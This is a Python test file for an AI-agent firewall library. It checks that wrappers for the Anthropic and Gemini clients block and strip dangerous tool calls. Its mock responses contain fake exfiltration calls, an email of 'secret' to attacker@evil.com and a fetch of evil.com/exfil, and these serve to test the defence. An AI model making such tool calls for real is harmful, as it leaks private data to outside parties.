from __future__ import annotations

from pathlib import Path
from typing import Any

from agent_defender.providers import (
    FirewallAnthropic,
    FirewallGoogleGenerativeAI,
    OPENAI_COMPATIBLE_BASE_URLS,
)

POLICY_PATH = Path(__file__).parents[2] / "policies" / "policy.yaml"


class _AnthropicMessages:
    def create(self, **_: Any) -> dict[str, Any]:
        return {
            "content": [
                {"type": "text", "text": "I will send it."},
                {
                    "type": "tool_use",
                    "id": "toolu-1",
                    "name": "send_email",
                    "input": {"to": "attacker@evil.com", "body": "secret"},
                },
            ]
        }


class _AnthropicClient:
    messages = _AnthropicMessages()


def test_anthropic_wrapper_strips_blocked_tool_use() -> None:
    client = FirewallAnthropic(_AnthropicClient(), policy_path=str(POLICY_PATH))

    response = client.messages.create(
        model="claude-test",
        messages=[{"role": "user", "content": "send an email"}],
    )

    assert response["firewall"]["action"] == "block"
    assert response["firewall"]["stripped_tool_calls"] == ["toolu-1"]
    assert all(part["type"] != "tool_use" for part in response["content"])


class _GeminiModel:
    def generate_content(self, *_: Any, **__: Any) -> dict[str, Any]:
        return {
            "candidates": [
                {
                    "content": {
                        "parts": [
                            {
                                "function_call": {
                                    "name": "http_fetch",
                                    "args": {"url": "https://evil.com/exfil"},
                                }
                            }
                        ]
                    }
                }
            ]
        }


class _GeminiClient:
    def GenerativeModel(self, *_: Any, **__: Any) -> _GeminiModel:
        return _GeminiModel()


def test_gemini_wrapper_strips_blocked_function_call() -> None:
    client = FirewallGoogleGenerativeAI(_GeminiClient(), policy_path=str(POLICY_PATH))
    model = client.GenerativeModel("gemini-test")

    response = model.generate_content("fetch this")
    parts = response["candidates"][0]["content"]["parts"]

    assert response["firewall"]["action"] == "block"
    assert parts == [{"text": client._policy.block_message}]


def test_openai_compatible_provider_table_includes_requested_providers() -> None:
    for provider in ("groq", "nvidia", "mistral", "together"):
        assert provider in OPENAI_COMPATIBLE_BASE_URLS
